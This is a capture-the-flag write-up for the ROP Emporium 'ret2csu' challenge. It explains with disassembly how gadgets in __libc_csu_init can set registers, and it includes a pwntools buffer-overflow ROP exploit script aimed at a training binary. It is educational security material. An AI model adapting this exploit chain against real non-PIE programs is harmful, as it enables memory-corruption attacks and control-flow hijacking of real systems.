# RET2CSU

[ret2csu](https://ropemporium.com/challenge/ret2csu.html)

This is the last ROP challenge from ROP emporium. This time, the author has (cruelly) removed any useful gadgets we can chain together to call the `ret2win()` function. However, there is still a loophole that every ELF binary has (huge asterisk), one that we can use to our advantage.

The goal of `ret2csu` is similar to that of `callme`, which is to call a function with 3 arguments: `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, `0xd00df00dd00df00d` until flag gets printed onto the terminal. For `ret2csu`, all we have to do is to load those 3 arguments into `rdi`, `rsi`, and `rdx` respectively, and then call `ret2win()`.

Popping the first 2 arguments into `rdi` and `rsi` is easy enough, here are 2 gadgets that `ROPgadget` has identified that we can use to do this:

```
$ ROPgadget --binary ./ret2csu --ropchain
...
0x00000000004006a3 : pop rdi ; ret
0x00000000004006a1 : pop rsi ; pop r15 ; ret
...
```

Sadly, there is no way for us to manipulate the `rdx` register using the gadgets identified by `ROPgadget`. Therefore, we have to turn to another approach to load `0xd00df00dd00df00d` into `rdx`.

Let's go back to the [BlackHat Asia paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) that ROP emporium linked. This paper suggests that we utilise the instructions in the `__libc_csu_init()` function that is present on every GCC-compiled ELF executable, more specifically, this section:

```
$ gdb ./ret2csu
...
> disassemble __libc_csu_init
...
   0x0000000000400680 <+64>:    mov    rdx,r15 <- IMPORTANT
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:    add    rbx,0x1
   0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:    add    rsp,0x8
   0x000000000040069a <+90>:    pop    rbx <- IMPORTANT
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret
...
```

Since the executable does not have PIE enabled, we can safely assume that the memory addresses of these instructions will be the same as shown in the snippet during runtime. By inspecting this disassembled section of `__libc_csu_init()`, we found an instruction that moves the value of `r15` to `rdx` at `0x400680`.

Now let's copy all of the required addresses into `win.py` and watch what happens.

```python
from pwn import *
...
RET = p64(0x4004e6) # ret
POPRDI = p64(0x4006a3) # pop rdi ; ret
POPRSIR15 = p64(0x4006a1) # pop rsi ; pop r15 ; ret
MOVRDXR15 = p64(0x400680) # mov rdx, r15
RET2WIN = 0x400510
ARG0 = 0xdeadbeefdeadbeef
ARG1 = 0xcafebabecafebabe
ARG2 = 0xd00df00dd00df00d
...
attack = b"A"*0x28
attack += POPRDI + p64(ARG0)
attack += POPRSIR15 + p64(ARG1) + p64(ARG2)
attack += MOVRDXR15
attack += RET + p64(RET2WIN)
...
```

```
$ ./win.py
...
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> Thank you!
[*] Got EOF while reading in interactive
...
```

Obviously, the last question in a test can't be that simple. If you know your stuff, you would have realised that there are a lot of instructions between `mov rdx, r15` and the next `call` or `ret`, so we can't simply add `MOVRDXR15` to our attack and expect everything to work.

What do?

Let's take a look at the instruction at `0x40069a` (nice) and after:

```
...
   0x000000000040069a <+90>:    pop    rbx <- IMPORTANT
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret
...
```

We have control over quite a number of registers (6 of them!). Even though we only want to manipulate the value of `r15`, we still have to carefully consider what values we should give the other registers. You'll see why that's important later.

Let's go back to the `mov rdx, r15` instruction at `0x400680`:

```
...
   0x0000000000400680 <+64>:    mov    rdx,r15 <- IMPORTANT
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:    add    rbx,0x1
   0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:    add    rsp,0x8
   0x000000000040069a <+90>:    pop    rbx <- IMPORTANT
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret
...
```

From what we can see, we can set the value of `rsi` by popping the value of `r14` (`0x400683`). Unfortunately, the next instruction (`mov edi, r13d`) only allows us to copy 32 bits of r13 to `edi`, so we still have to set `rdi` using the `pop rdi ; ret` gadget we found just now.

```
...
   0x0000000000400680 <+64>:    mov    rdx,r15
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
...
```

Now we stumble across the most challenging roadblock in `ret2csu`:

```
...
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
...
```

This instruction requires that the value referenced by `r12+rbx*8` be a valid function (another asterisk). In addition, the function that this instruction calls should ideally not ruin our stack (if it's just a simple `ret`, that would be great). Unfortunately, finding such a function will take some blood, sweat and tears.

Since we know that all of the functions are stored at `0x40xxxx` (thanks `"NO PIE"`), we should find a sequence that looks something like `xx xx 40 00 00 00 00 00` in the `ret2csu` executable. Remember, x86 is little endian, so the bytes in the integer are reversed.

After searching for a couple of minutes, I managed to find this:

```
$ objdump -M intel -D ./ret2csu
...
  600e47:       00 [b4 06 40 00 00 00    add    BYTE PTR [rsi+rax*1+0x40],dh
  600e4e:       00 00]                   add    BYTE PTR [rax],al
...
```

There it is, at `0x600e48`: `b4 06 40 00 00 00 00 00`. If we de-little-endian this, we get the following value: `0x4006b4`.

Let's look at what `0x4006b4` points to:

```
$ objdump -M intel -D ./ret2csu
...
00000000004006b4 <_fini>:
  4006b4:       48 83 ec 08             sub    rsp,0x8
  4006b8:       48 83 c4 08             add    rsp,0x8
  4006bc:       c3                      ret
...
```
**Jackpot!** Since the `_fini()` function pushes and pops a value before returning to the caller function, it's a suitable candidate for us to call when the instruction pointer rolls over to `call QWORD PTR [r12+rbx*8]`. Hence, we know the value of `r12+rbx*8` must be `0x600e48`. For simplicity, we can set `r12` to `0x600e48` while `rbx` can be set to `0x0`.

After the `call` instruction, `__libc_csu_init()` does this:

```
...
   0x000000000040068d <+77>:    add    rbx,0x1
   0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
...
```

In a nutshell, we have to make sure that `rbx+1 == rbp` to avoid `__libc_csu_init()` from jumping to `0x400680`. Thus `rbp` should be `0x1` since we decided to set `rbx` to `0x0` previously.

Once we have made it past that hurdle, we come across 7 pops before `__libc_csu_init()` returns. Remember, the `add rsp, 0x8` instruction is like popping a 64-bit integer from the stack (since the stack grows downwards), just that the value is not saved to any register.

```
...
   0x0000000000400696 <+86>:    add    rsp,0x8
   0x000000000040069a <+90>:    pop    rbx
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret
...
```

Now that we have understood the control flow of `__libc_csu_init()`, we now know what values we should be popped into the registers before we move `r15` and `r14` to `rdx` to `rsi` respectively.

| Register | Value | Remarks |
| - | - | - |
| rbx | 0 | Set this to 0 to make the call instruction less complicated. |
| rbp | 1 | `rbp` must be greater than `rbx` by 1 to skip the `jne 0x400680 <__libc_csu_init+64>` instruction. |
| r12 | 0x600e48 | When `r12` is set to this value, the `call [r12+rbx*8]` instruction will call `[0x600e48] -> 0x4006b4 -> _fini()`. |
| r13 | b"anything" | Any random 8-byte value will do since we are not going to use `r13`. |
| r14 | 0xcafebabecafebabe | Second argument to be moved into `rsi`. |
| r15 | 0xd00df00dd00df00d | Third argument to be moved into `rdx`. |

Here's the script that should hopefully yield us our flag:

```python
from pwn import *
...
RET = p64(0x4004e6) # ret
POPRDI = p64(0x4006a3) # pop rdi ; ret
# mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12 + rbx*8] ;
# add rbx, 1 ; cmp rbp, rbx ; jne 0x400680 ; add rsp, 8 ; pop rbx ; pop rbp ;
# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
MOVRDXR15_MOVRSIR14 = p64(0x400680)
# pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15
POPRBXRBPR12R13R14R15 = p64(0x40069a)
ARG0 = 0xdeadbeefdeadbeef
ARG1 = 0xcafebabecafebabe
ARG2 = 0xd00df00dd00df00d
DATA = 0x601028
POINTER_TO_FINI = p64(0x600e48) # *0x600e48 == 0x00000000_004006b4 <- _fini (does nothing but ret)
RET2WIN = 0x400510
...
attack = b"A"*0x28 # buffer overflow

# make sure r12 + rbx*8 points to somewhere that returns
# make sure rbx+1 == rbp
# make sure r14 is ARG1 and r15 is ARG2
attack += POPRBXRBPR12R13R14R15 # pop necessary values into the 6 registers.
attack += p64(0) # rbx
attack += p64(1) # rbp
attack += POINTER_TO_FINI # r12
attack += b"anything" # r13
attack += p64(ARG1) # r14
attack += p64(ARG2) # r15

# mov r15 into rdx and r14 into rsi
# then let the gadget pop 7 8-byte values
attack += MOVRDXR15_MOVRSIR14 + b"."*(7*8)

attack += POPRDI + p64(ARG0) # set rdi to the first argument

attack += RET + p64(RET2WIN) # call ret2win with rdi, rsi and rdx with the correct arguments

io.sendline(attack)
...
```
